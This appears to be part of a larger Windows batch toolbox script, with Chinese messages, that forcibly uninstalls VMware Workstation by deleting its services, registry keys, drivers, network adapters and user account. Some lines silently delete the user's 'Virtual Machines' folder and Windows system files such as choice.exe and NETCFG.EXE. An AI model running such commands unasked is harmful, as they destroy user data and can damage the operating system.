net stop "VMware Registration Service"
net stop VMUSBArbService
net stop VMwareHostd
net stop VMAuthdService
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc." /f >nul 2>nul
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\VMware, Inc." /f >nul 2>nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\VMware, Inc." /f >nul 2>nul
reg delete "HKCR\Installer\Products\7A26F0EA2A1AF704F9C48439B99DDAD8" /f >nul 2>nul
reg delete "HKCR\Installer\Products\0C6B325AF07E1AF439D3AD4079F106F7" /f >nul 2>nul
reg delete "HKCR\Installer\Products\A57F49D06AE015943BFA1B54AFE9506C" /f >nul 2>nul
reg delete "HKCR\Installer\Features\7A26F0EA2A1AF704F9C48439B99DDAD8" /f >nul 2>nul
reg delete "HKCR\Installer\Features\7A79579133DA8984D9E8376086814B46" /f >nul 2>nul
reg delete "HKCR\Installer\Features\A116201D664610145AD115603930CA56" /f >nul 2>nul
reg delete "HKCR\Installer\Features\BC78C1BA70810FC44B2CEC1EC481DC4B" /f >nul 2>nul
reg delete "HKCR\Installer\Features\C3839DFF5D1079849A4534FA95A9DE03" /f >nul 2>nul
reg delete "HKCR\Installer\Features\DBBFB30076C6E9142AD4D0ACCFA32594" /f >nul 2>nul
reg delete "HKCR\Installer\Products\7A79579133DA8984D9E8376086814B46" /f >nul 2>nul
reg delete "HKCR\Installer\Products\A116201D664610145AD115603930CA56" /f >nul 2>nul
reg delete "HKCR\Installer\Products\BC78C1BA70810FC44B2CEC1EC481DC4B" /f >nul 2>nul
reg delete "HKCR\Installer\Products\C3839DFF5D1079849A4534FA95A9DE03" /f >nul 2>nul
reg delete "HKCR\Installer\Products\DBBFB30076C6E9142AD4D0ACCFA32594" /f >nul 2>nul
reg delete "HKCR\Installer\Products\7A26F0EA2A1AF704F9C48439B99DDAD8" /f >nul 2>nul
reg delete "HKCR\Installer\Products\7A79579133DA8984D9E8376086814B46" /f >nul 2>nul
reg delete "HKCR\Installer\Products\A116201D664610145AD115603930CA56" /f >nul 2>nul
reg delete "HKCR\Installer\Products\BC78C1BA70810FC44B2CEC1EC481DC4B" /f >nul 2>nul
reg delete "HKCR\Installer\Products\C3839DFF5D1079849A4534FA95A9DE03" /f >nul 2>nul
reg delete "HKCR\Installer\Products\DBBFB30076C6E9142AD4D0ACCFA32594" /f >nul 2>nul
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\7A26F0EA2A1AF704F9C48439B99DDAD8" /f >nul 2>nul
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\7A79579133DA8984D9E8376086814B46" /f >nul 2>nul
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\A116201D664610145AD115603930CA56" /f >nul 2>nul
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\BC78C1BA70810FC44B2CEC1EC481DC4B" /f >nul 2>nul
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\C3839DFF5D1079849A4534FA95A9DE03" /f >nul 2>nul
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\DBBFB30076C6E9142AD4D0ACCFA32594" /f >nul 2>nul
echo 取消DLL文件的注册... 
regsvr32 /u /s "%cd%/vmappcfg.dll" 
regsvr32 /u /s "%cd%/vmappsdk.dll" 
regsvr32 /u /s "%cd%/vmdbCOM.dll" 
regsvr32 /u /s "%cd%/vmhwcfg.dll" 
regsvr32 /u /s "%cd%\V2V\IntraProcessLogging.dll" 
regsvr32 /u /s "%cd%\V2V\reconfig.dll" 
regsvr32 /u /s "%cd%\V2V\vhdcvtcom.dll" 
regsvr32 /u /s "%cd%\V2V\vmc2vmx.dll" 
regsvr32 /u /s "%cd%\V2V\vpcCvt.dll" 
echo 正在删除虚拟网卡，请稍后…… 
:delete VM Network 
start /wait vnetlib -- remove adapter vmnet1 
start /wait vnetlib -- remove adapter vmnet8 
start /wait vnetlib -- remove dhcp vmnet1 
start /wait vnetlib -- remove dhcp vmnet8 
start /wait vnetlib -- remove nat vmnet8 
:delservice 
echo 正在删除服务... 
call :删除服务 vmnetbridge 
call :删除服务 VMAuthdService 
call :删除服务 vmx86 
call :删除服务 VMnetAdapter 
call :删除服务 "VMware NAT Service" 
call :删除服务 "VMnetDHCP" 
call :删除服务 VMnetuserif 
call :删除服务 hcmon 
call :删除服务 Vmparport 
call :删除服务 vstor2-ws60 
call :删除服务 vstor2 
call :删除服务 vmkbd 
"%cd%\VMMount\vmount2.exe" /Unregserver 
netcfg -u vmware_bridge 
echo. 
:delfile 
echo 删除安装的文件.... 
call :删除文件 %systemroot%\inf\vmnet.sys 
call :删除文件 %systemroot%\inf\vmnetBridge.dll 
call :删除文件 %systemroot%\inf\netbridge.inf 
call :删除文件 %systemroot%\inf\vmnetBridge.sys 
call :删除文件 %systemroot%\inf\vmusb.cat 
call :删除文件 %systemroot%\inf\vmusb.inf 
call :删除文件 %systemroot%\inf\vmusb.sys 
call :删除文件 %systemroot%\inf\netadapter.inf 
call :删除文件 %systemroot%\inf\vmnetAdapter.sys 
call :删除文件 %systemroot%\inf\vnetinst.dll 
call :删除文件 %systemroot%\lastgood\system32\drivers\vmnetadapter.sys 
call :删除文件 %systemroot%\lastgood\system32\drivers\vmnet.sys 
call :删除文件 %systemroot%\lastgood\system32\drivers\vmnetbridge.sys 
call :删除文件 %systemroot%\system32\drivers\vmnetadapter.sys 
call :删除文件 %systemroot%\system32\drivers\vmnet.sys 
call :删除文件 %systemroot%\system32\drivers\vmnetbridge.sys 
call :删除文件 %systemroot%\system32\drivers\vmusb.sys 
call :删除文件 %systemroot%\system32\drivers\hcmon.sys 
call :删除文件 %systemroot%\system32\drivers\vmnetuserif.sys 
call :删除文件 %systemroot%\system32\drivers\vmparport.sys 
call :删除文件 %systemroot%\system32\drivers\vmx86.sys 
call :删除文件 %systemroot%\system32\NETCFG.EXE 
call :删除文件 %systemroot%\system32\choice.exe 
call :删除文件 %systemroot%\system32\devcon.exe  
rd /s /q %APPDATA%\vmware 
rd /s /q "\Virtual Machines"  
:delreg 
echo 删除注册表.... 
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc." /f 
:deluser 
echo 删除用户__vmware_user__... 
net user __vmware_user__ /delete 
net localgroup __vmware__ /delete  
cls
pause>nul|echo 卸载完成...... 
goto tools520
goto :eof 
:删除文件 
echo 正在删除文件 %* 
del /f /q "%*" >nul 2>nul 
del /f /q %APPDATA%\VMware\*.*
goto :eof 
:删除服务 
echo 正在删除服务 %* 
net stop %* 2>nul 
sc delete %* 
goto :eof

:end  
cls
title 工作完成！
color 2e
echo 恭喜
echo 工作完成！
ctfmon
echo.
echo 已重新启动输入法！
pause>nul
goto maxice

:ColorText
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1
goto :eof